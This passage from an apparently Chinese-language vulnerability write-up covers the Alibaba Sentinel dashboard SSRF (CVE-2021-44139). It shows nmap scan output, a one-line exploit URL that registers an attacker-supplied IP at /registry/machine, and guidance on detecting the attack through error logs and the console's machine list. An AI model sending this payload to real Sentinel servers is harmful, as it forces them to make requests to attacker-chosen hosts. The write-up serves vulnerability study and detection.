class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h3 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h3><h4 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h4><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h4 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h4><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a 